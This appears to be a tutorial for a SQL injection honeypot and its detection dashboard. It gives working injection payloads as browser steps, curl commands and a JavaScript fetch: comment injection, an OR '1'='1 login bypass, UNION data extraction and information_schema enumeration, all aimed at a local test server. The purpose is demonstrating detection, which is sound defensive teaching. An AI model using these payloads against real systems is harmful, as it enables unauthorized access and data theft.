# SQL Injection Honeypot Tutorial

This tutorial demonstrates various SQL injection attacks and how our Honeypot Security Information and Event Management (HSIEM) system detects and classifies them. We'll explore different severity levels of attacks and analyze the system's response.

## Setup Requirements

- Running honeypot application (port 9000)
- Access to HSIEM dashboard
- MySQL/MariaDB database
- Basic understanding of SQL injection techniques
- Web browser (Chrome/Firefox recommended)

## Attack Scenarios and Detection

### 1. LOW Severity Attack - Comment Injection
**Risk Score: 0.357**

This basic attack attempts to manipulate SQL query logic using comment syntax.

**Browser Method:**
1. Navigate to `http://localhost:9000/products`
2. In the category search box, enter: `test'--`
3. Press Enter or click Search

**Curl Method:**
```bash
curl "http://localhost:9000/api/products?category=test'--"
```

**Attack Details:**
- Type: SQL_INJECTION_PRODUCTS
- Injection Point: category_parameter
- Target: product_query
- Technique: Comment-based query manipulation

**Detection:**
The system identifies this as a low-risk attack due to:
- Simple comment injection pattern
- No attempt to extract data
- Basic query manipulation

### 2. MEDIUM Severity Attack - Authentication Bypass
**Risk Score: 0.398**

This attack attempts to bypass login authentication using OR conditions.

**Browser Method:**
1. Navigate to `http://localhost:9000/login`
2. In the username field, enter: `admin' OR '1'='1`
3. In the password field, enter: `anything`
4. Click Login

**Curl Method:**
```bash
curl -X POST "http://localhost:9000/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=anything"
```

**Attack Details:**
- Type: SQL_INJECTION_LOGIN
- Injection Point: login_form
- Target: authentication
- Technique: Boolean-based authentication bypass

**Detection:**
Classified as medium severity because:
- Targets authentication mechanism
- Uses boolean logic manipulation
- Attempts privilege escalation

### 3. HIGH Severity Attack - Data Extraction
**Risk Score: 0.532**

This attack attempts to extract data from the database using UNION-based injection.

**Browser Method:**
1. Navigate to `http://localhost:9000/products`
2. In the URL bar, modify the category parameter:
   ```
   http://localhost:9000/products?category=1' UNION SELECT id,name,description,price,category FROM products --
   ```
3. Press Enter

**Curl Method:**
```bash
curl "http://localhost:9000/api/products?category=1' UNION SELECT id,name,description,price,category FROM products --"
```

**Attack Details:**
- Type: SQL_INJECTION_PRODUCTS
- Injection Point: category_parameter
- Target: product_query
- Technique: UNION-based data extraction

**Detection:**
Marked as high severity because:
- Uses UNION operator for data extraction
- Attempts to read sensitive table data
- Shows knowledge of database schema

### 4. CRITICAL Severity Attack - Schema Enumeration
**Risk Score: 0.703**

This sophisticated attack attempts to enumerate database schema and perform destructive operations.

**Browser Method:**
1. Open Browser Developer Tools (F12)
2. Navigate to `http://localhost:9000/products`
3. In the URL bar, paste the following (after proper URL encoding):
   ```
   http://localhost:9000/products?category=1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --
   ```
4. Press Enter

**Alternative Browser Method:**
1. Navigate to `http://localhost:9000/products`
2. Open Browser Developer Tools (F12)
3. In Console, execute:
   ```javascript
   fetch('/api/products?category=' + encodeURIComponent("1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --"))
   .then(r => r.json())
   .then(console.log)
   ```

**Curl Method:**
```bash
curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --"
```

**Attack Details:**
- Type: SQL_INJECTION_PRODUCTS
- Injection Point: category_parameter
- Target: product_query
- Technique: Schema enumeration with information_schema

**Detection:**
Classified as critical severity because:
- Accesses system tables (information_schema)
- Attempts to enumerate database structure
- Shows advanced SQL injection knowledge

## Real-time Monitoring

### Using Two Browser Windows
For the best demonstration experience:

1. **Window 1: HSIEM Dashboard**
   - Navigate to `http://localhost:9000/hsiem`
   - Keep this window visible to observe real-time updates

2. **Window 2: Attack Window**
   - Use this window to perform the attacks
   - Try different attack patterns
   - Observe how risk scores change in the HSIEM dashboard

### What to Watch For
1. **Risk Score Graph**
   - Watch the trend line move as attacks are detected
   - Notice different severity bands (color-coded)
   - Observe score spikes for more severe attacks

2. **Event List**
   - New events appear in real-time
   - Click "View" on events to see details
   - Notice pattern recognition in attack description

3. **Statistics**
   - Attack count increases
   - Risk score averages update
   - Source IP tracking

## Monitoring and Analysis

### HSIEM Dashboard
The HSIEM dashboard provides real-time monitoring of attacks:
1. Risk score trending
2. Attack type classification
3. Detailed event information
4. Source IP tracking

### Log Analysis
Three types of logs are maintained:
1. **Database Logs**: Detailed attack information in `attack_logs` table
2. **Honeypot Logs**: Application-level logging in `logs/honeypot.log`
3. **HSIEM Logs**: Security event logs in `hsiem_logs/`

### Risk Score Calculation
Risk scores are calculated based on multiple factors:
- Attack complexity
- Target sensitivity
- Potential impact
- Attack technique sophistication

## Prevention and Response

### Automated Responses
The system automatically:
1. Logs all attack attempts
2. Calculates risk scores
3. Generates security alerts
4. Maintains attack history

### Best Practices
1. Regularly monitor the HSIEM dashboard
2. Investigate high and critical severity attacks
3. Update attack signatures
4. Review and analyze attack patterns

## Conclusion

This honeypot system effectively detects and classifies SQL injection attacks while providing valuable insight into attack patterns and techniques. The risk scoring system helps prioritize security responses, while comprehensive logging enables detailed forensic analysis. Using both browser-based and command-line testing methods provides a comprehensive understanding of how attacks are detected and analyzed in real-world scenarios. 